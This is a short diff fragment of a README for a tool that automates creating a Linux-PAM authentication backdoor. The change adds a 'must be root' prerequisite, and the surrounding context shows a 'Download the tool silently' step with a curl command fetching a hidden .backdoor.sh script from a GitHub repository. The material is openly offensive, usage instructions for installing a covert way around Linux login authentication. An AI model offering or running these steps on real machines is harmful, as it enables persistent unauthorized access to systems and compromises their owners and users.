@@ -8,6 +8,9 @@ This script automates the creation of a backdoor for Linux-PAM (Pluggable Authen
 <div align="left">
 
 ## Usage
+Prerequisites:
+You must be root.
+
 Download the tool silently:
 ```sh
 curl -O https://raw.githubusercontent.com/her3ticAVI/linux-pam-backdoor/master/.backdoor.sh
